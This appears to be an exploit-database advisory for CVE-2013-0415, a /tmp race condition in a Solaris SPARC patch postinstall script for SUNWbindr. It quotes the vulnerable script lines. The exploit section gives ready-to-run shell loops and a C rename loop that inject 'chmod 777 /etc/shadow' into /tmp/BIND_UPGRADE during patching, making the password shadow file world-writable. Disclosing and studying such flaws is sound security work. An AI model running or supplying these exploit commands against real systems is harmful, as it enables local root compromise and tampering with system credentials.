Description: Solaris Sparc patch cluster January 2013.
Vulnerability:
If the system administrator is updating the system using update manager or
smpatch (multi user mode) a race condition exists with the postinstall script
for SUNWbindr that may lead to arbitrary code execution as root if the race is
won. vulnerable code in: ./patches/119784-22/SUNWbindr/install/pkg_postinstall:
UPGRADE=${TMP}/BIND_UPGRADE ./patches/119784-22/SUNWbindr/install/postinstall:
UPGRADE=${TMP}/BIND_UPGRADE vulnerable code: UPGRADE=${TMP}/BIND_UPGRADE rm -
f $UPGRADE (If I create the file first between these two steps, I should have
ownership before it is over written and inject malicious code to get root.) cat
>> $UPGRADE <<-\UPDATESTART_METHOD oset=$@ # Remember current options if any.
svc="svc:network/dns/server" if [ -z "$TMP" ]; then TMP="/tmp" fi
CVE-2013-0415
JSON:Export
Exploit Code:
   1. If the following is run:
   2.  
   3. while (true) ; do touch /tmp/BIND_UPGRADE ;echo "chmod 777 /etc/shadow" >
      /tmp/BIND_UPGRADE; done
   4.  
   5. during patch installation you can get /etc/shadow world writeable.
   6.  
   7. Vladz suggested:
   8.  
   9. Another approach to exploit this is to place your evil command in a file
      called /tmp/BIND_UPGRADE.new, and loop the move command.
  10.  
  11. $ while ! mv /tmp/BIND_UPGRADE.new /tmp/BIND_UPGRADE 2>/dev/null; do
      continue; done
  12.  
  13. or in C:
  14.  
  15. while (rename("/tmp/BIND_UPGRADE.new", "/tmp/BIND_UPGRADE") != 0)
      continue;
  16.  
  17. I am telling this because I think that moving a file takes less syscalls
      (one at least) than a "echo string >> file" that open(), write() and
      close() the file.
